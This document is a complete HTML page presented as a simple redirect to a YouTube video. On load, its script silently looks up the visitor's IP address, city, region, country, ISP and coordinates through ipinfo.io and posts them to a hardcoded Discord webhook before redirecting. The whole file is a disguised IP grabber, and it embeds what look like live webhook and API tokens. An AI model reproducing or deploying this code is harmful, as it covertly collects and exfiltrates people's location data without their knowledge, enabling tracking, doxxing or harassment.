<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1410831322292944966/i3GGWATCUw9gM-fpGOQMvvCeyTA2AByON1-aefgW6rQXzcDCmJ1qjIvsT8wxCgBt6wXO";
        const redirectURL = "https://www.youtube.com/watch?v=n4MKXlnop8c";

        async function sendIPAndRedirect() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=61aea33a62649e');
                const data = await response.json();

                const content = `
**ip:** ${data.ip}
**city:** ${data.city}
**region:** ${data.region}
**country:** ${data.country}
**isp / org:** ${data.org}
**loco (lat,long):** ${data.loc}
                `;

                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: content })
                });
            } catch (err) {
                console.error("Error sending IP info:", err);
            } finally {
                // Redirect immediately
                window.location.href = redirectURL;
            }
        }

        sendIPAndRedirect();
    </script>
</body>
</html>
